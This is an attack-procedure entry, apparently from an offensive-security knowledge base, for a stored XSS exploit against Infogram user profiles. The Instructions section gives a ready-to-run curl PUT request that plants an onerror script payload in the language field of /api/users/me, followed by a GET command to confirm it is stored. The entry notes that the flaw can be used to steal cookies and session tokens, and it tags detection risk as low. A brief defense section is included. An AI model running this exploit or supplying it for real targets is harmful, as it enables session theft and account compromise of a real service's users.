---
id: proc-inject-xss-infogram
name: Inject-XSS-Payload-into-Infogram-Profile
tags:
  - xss
  - stored-xss
  - infogram
  - profile-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/update-infogram-profile-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:09.743Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Infogram-Profile

## Summary

This procedure exploits a stored XSS vulnerability in the Infogram user profile by injecting a malicious JavaScript payload into the language parameter via the /api/users/me endpoint, allowing execution when profiles are viewed publicly.

## Description

The attack targets the lack of input sanitization in the language field during profile updates. A PUT request stores the payload server-side, and it renders unsafely on public profile pages like https://infogram.com/dd_ddt7. This enables arbitrary JS execution in victims' browsers, potentially stealing cookies, session tokens, or other data. Prerequisites include a valid Infogram account for authenticated API access.

## Requirements

1. Authenticated session to Infogram API (e.g., via login cookies or auth headers).
2. HTTP client like curl for sending the PUT request.
3. Knowledge of the target's profile editing endpoint (/api/users/me).

## Defense

Defensive measures and detection strategies:

- Implement input validation and output encoding (e.g., HTML entity escaping) for all user profile fields.
- Use Content Security Policy (CSP) to restrict inline script execution on profile pages.
- Monitor API logs for suspicious payloads in language parameters containing script tags or event handlers.

## Objectives

1. Store malicious JavaScript in the profile without triggering sanitization.
2. Ensure payload executes on profile rendering to capture victim data.
3. Demonstrate impact by alerting the domain or exfiltrating data.

## Instructions

### Step 1: Prepare and Authenticate

**Context**: Log in to Infogram and obtain necessary auth tokens or cookies to access the profile API.

No specific command; use browser or API client to authenticate.

> Expected: Valid session for subsequent requests.

### Step 2: Inject the XSS Payload

**Context**: Send the PUT request to update the profile, embedding the payload in the language parameter to close any existing script tags and inject an onerror handler.

**Command** ([[commands/update-infogram-profile-xss]]):
```bash
curl -X PUT https://infogram.com/api/users/me \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "first_name=name&last_name=name&username=&confirm_password=password&language="></script><img src=x onerror=alert(document.domain)>;"
```

> This command updates the profile with arbitrary values for other fields and the XSS payload in language. Expected output: JSON response like {"success": true} or HTTP 200, confirming storage. The payload ""></script><img src=x onerror=alert(document.domain)>;" breaks out of HTML context and executes JS on load.

### Step 3: Verify Storage

**Context**: Check the profile via GET request or view the public page to confirm the payload is stored.

**Command** (use curl for GET):
```bash
curl -X GET https://infogram.com/api/users/me
```

> Inspect the response for the language field containing the payload. Successful if unaltered.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques

- None

## Commands Used

- [[commands/update-infogram-profile-xss]]

## Tools Used

- None

## Tags

- [[xss]]
- [[stored-xss]]
- [[infogram]]
